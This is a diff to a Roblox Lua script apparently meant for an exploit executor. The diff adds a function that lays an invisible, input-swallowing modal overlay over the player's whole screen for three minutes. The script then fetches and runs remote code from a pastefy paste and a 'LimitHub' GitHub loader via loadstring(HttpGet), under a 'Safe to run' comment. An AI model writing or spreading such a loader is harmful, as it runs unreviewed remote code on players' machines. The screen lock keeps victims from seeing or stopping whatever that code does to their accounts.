@@ -2,6 +2,32 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
+--// Input Blocker (3 mins)
+local function blockUserInput(duration)
+    local inputBlocker = Instance.new("ScreenGui")
+    inputBlocker.Name = "InputBlocker"
+    inputBlocker.ResetOnSpawn = false
+    inputBlocker.IgnoreGuiInset = true
+    inputBlocker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    inputBlocker.Parent = game:GetService("CoreGui")
+
+    local blocker = Instance.new("TextButton")
+    blocker.Size = UDim2.new(1, 0, 1, 0)
+    blocker.Position = UDim2.new(0, 0, 0, 0)
+    blocker.BackgroundTransparency = 1
+    blocker.Text = ""
+    blocker.Modal = true
+    blocker.AutoButtonColor = false
+    blocker.Parent = inputBlocker
+
+    task.delay(duration, function()
+        if inputBlocker then inputBlocker:Destroy() end
+    end)
+end
+
+-- Block input for 180 seconds (3 mins)
+blockUserInput(180)
+
 --// Create ScreenGui
 local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 screenGui.Name = "ExecutorDetectorUI"
@@ -85,5 +111,5 @@ else
 
     -- ✅ Safe to run script now
     loadstring(game:HttpGet("https://pastefy.app/fJnI69gN/raw"))()
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Loader.lua')))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Loader.lua"))()
 end
